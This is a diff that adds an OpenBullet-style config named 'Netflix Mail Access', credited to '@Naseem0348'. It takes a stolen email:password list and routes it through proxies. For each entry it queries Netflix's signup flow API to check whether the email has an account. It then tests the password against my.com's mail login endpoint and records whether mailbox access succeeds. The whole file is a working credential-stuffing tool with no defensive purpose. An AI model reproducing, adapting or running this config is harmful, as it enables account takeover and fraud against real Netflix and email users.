@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "Netflix Mail Access",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-12T13:37:54.1155093+05:30",
+  "AdditionalInfo": "",
+  "Author": "𝙉𝘼𝙎𝙀𝙀𝙈",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#esn FUNCTION RandomString "NFAPPL-02-IPHONE9=3-2?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m?m" -> VAR "esn" 
+
+REQUEST GET "https://www.netflix.com" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR ",\"authURL\":\"" "\",\"" -> VAR "auth1" 
+
+#authURL FUNCTION Unescape "<auth1>" -> VAR "authURL" 
+
+REQUEST POST "https://www.netflix.com/api/shakti/vb13b96d9/flowendpoint?flow=signupSimplicity&mode=welcome&landingURL=%2F&landingOrigin=https%3A%2F%2Fwww.netflix.com&inapp=false&esn=<esn>&languages=en-US&netflixClientPlatform=browser" 
+  CONTENT "{\"flow\":\"signupSimplicity\",\"mode\":\"welcome\",\"authURL\":\"<authURL>\",\"action\":\"saveAction\",\"fields\":{\"email\":{\"value\":\"<USER>\"}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Host: www.netflix.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-Netflix.Client.Request.Name: ui/xhrUnclassified" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://www.netflix.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.netflix.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "mode\":\"switchFlow\"" 
+  KEYCHAIN Failure OR 
+    KEY "mode\":\"registration" 
+    KEY "mode\":\"passwordOnly" 
+
+REQUEST GET "https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login=<USER>&Password=<PASS>" 
+  
+  HEADER "User-Agent: MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" CONTAINS "Ok=1"
+
+#Mail_Access_=_True FUNCTION Constant "True" -> CAP "Mail Access" 
+
+#Owner FUNCTION Constant "@Naseem0348" -> CAP "Config Developed By" 
+
+ELSE
+
+#Mail_Access_=_False FUNCTION Constant "False" -> CAP "Mail Access" 
+
+#Owner FUNCTION Constant "@Naseem0348" -> CAP "Config Developed By" 
+
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Mail Access>" Contains "False" 
+
